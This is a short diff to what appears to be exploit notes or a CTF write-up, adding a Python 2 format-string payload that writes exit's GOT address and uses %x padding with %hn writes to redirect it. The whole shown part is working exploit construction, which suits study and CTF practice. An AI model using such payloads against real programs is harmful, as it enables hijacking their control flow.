@@ -16,6 +16,18 @@ payload += b"%2$hn"
 payload += b"%32261x"           => hex to decimal !!!
 payload += b"%1$hn"
 
+######################################################
+## or on python2
+######################################################
+payload  = ""
+payload += p32(exit_got)
+payload += p32(exit_got+2)
+payload += "%{}x".format(0x804 - len(payload))
+payload += "%2$hn"
+payload += "%{}x".format(0x8609 - 0x804)
+payload += "%1$hn"
+
+
 ```
 
 
